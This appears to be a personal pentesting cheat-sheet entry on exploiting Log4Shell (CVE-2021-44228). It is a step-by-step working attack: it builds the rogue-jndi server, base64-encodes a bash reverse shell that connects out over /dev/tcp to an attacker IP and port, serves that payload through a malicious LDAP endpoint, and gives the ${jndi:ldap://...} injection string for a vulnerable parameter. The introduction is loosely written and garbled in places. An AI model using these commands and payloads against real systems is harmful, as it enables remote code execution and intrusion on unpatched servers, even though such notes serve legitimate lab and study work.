# Log4Shell
## Introduction

For amazing visual and practical explanation of the affect on a MineCraft server please watch the [John Hammond - CVE-2021-44228 - Log4j](https://www.youtube.com/watch?v=7qoPDq41xhQ) YouTube video. This vulnerability was possible one of most severe 0days that could have been in use for over ten years and have wide application outside of hacking MineCraft servers. [Log4j](https://en.wikipedia.org/wiki/Log4j) is a Java Logging utility that it is used in web servers and application that use Java may use this logging utility and therefore probably therefore the worst 0day for the longest possible time (since 2014) that was only publicly disclosed and patched in 2021 named [Log4Shell](https://en.wikipedia.org/wiki/Log4Shell). An really interesting example for those that are probably reading this is [Kosmer's PoC](https://github.com/kozmer/log4j-shell-poc) showcasing the exploitation of Ghidra - [[Ghidra-Cheatsheet]]

## Requirements
```bash
apt update
apt install openjdk-11-jdk -y
apt-get install maven
mvn -v
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi  
mvn package
```

As of 2024 - tooling compatibility install Java 11..similarly as for `ysoserial`, etc
```bash
sudo apt-get install openjdk-11-jdk
```

## Pass the payload

Use the `rogue-jdni` server to pass a payload. First base64 encode the reverse shell payload.
```bash
echo 'bash -c bash -i >&/dev/tcp/$IP/$PORT 0>&1' | base64
```
Then within the `rogue-jndi` directory.
```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo, $ENCODEDPAYLOAD} | {base64,-d}|{bash,-i}" --hostname "$IP"
```

Post response set "vulnerable parametre to:
Note: port 1389 is the rogue-jndi server
```json
{
	vuln:"${jndi:ldap://$IP:1389/o=tomcat}",
}
```
Upgrade the terminal shell:
```bash
script /dev/null -c bash
```
